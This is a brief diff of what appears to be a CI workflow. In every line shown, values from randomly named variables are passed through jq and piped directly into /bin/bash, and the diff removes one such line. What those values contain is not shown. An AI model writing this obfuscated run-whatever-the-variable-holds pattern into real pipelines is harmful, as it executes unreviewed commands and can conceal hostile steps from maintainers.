@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$wvdgv7" | jq -r .a461 | /bin/bash
           printf '%s' "$h77389" | jq -r .igr0824 | /bin/bash
           echo $e887 | jq -r .eh21489 | /bin/bash
-          printf '%s' "$twjc474" | jq -r .iwec973 | /bin/bash
           echo $v897 | jq -r .a62640 | /bin/bash
 
       - name: Archive results
